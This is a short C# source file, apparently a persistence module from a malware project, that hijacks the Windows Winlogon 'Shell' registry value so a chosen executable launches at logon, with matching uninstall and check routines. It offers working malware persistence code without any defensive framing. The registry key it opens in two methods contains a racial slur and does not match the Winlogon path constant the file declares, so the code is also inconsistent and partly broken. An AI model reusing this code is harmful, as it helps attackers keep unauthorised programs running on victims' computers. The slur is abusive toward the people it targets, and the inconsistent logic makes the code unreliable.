using Microsoft.Win32;

namespace Main.Source.Functions.Persistence
{
    public class WinLogon
    {
        private const string LogonPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";

        public static void Install(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
            if (logon == null)
            {
                Utilities.Logger.Warn("WinLogon.Install: failed to open run");
            }
            else
            {
                try
                {
                    logon.SetValue("Shell", $"explorer.exe, \"{path}\" {ConfigMisc.LAUNCH_KEY}");
                }
                catch
                {
                    Utilities.Logger.Warn($"WinLogon.Install: failed to install");
                }
            }
        }

        public static void Uninstall()
        {
            var logon = Registry.CurrentUser.OpenSubKey("Software\\_nigger", true);
            if (logon == null)
            {
                Utilities.Logger.Warn("WinLogon.Uninstall: failed to open run");
            }
            else
            {
                try
                {
                    logon.SetValue("Shell", "explorer.exe");
                }
                catch
                {
                    Utilities.Logger.Warn($"WinLogon.Uninstall: failed to uninstall");
                }
            }
        }

        public static string Check(string path)
        {
            var logon = Registry.CurrentUser.OpenSubKey(LogonPath, false);
            if (logon == null)
            {
                return "Failed to open logon key";
            }

            var shell = logon.GetValue("Shell") as string;
            if (shell == null)
            {
                return "Failed to find file";
            }

            if (shell == "explorer.exe")
            {
                return "File is not allowed to auto start (1)";
            }

            if (!shell.Contains(path))
            {
                return "File is not allowed to auto start(2)";
            }

            return "All is good";
        }
    }
}
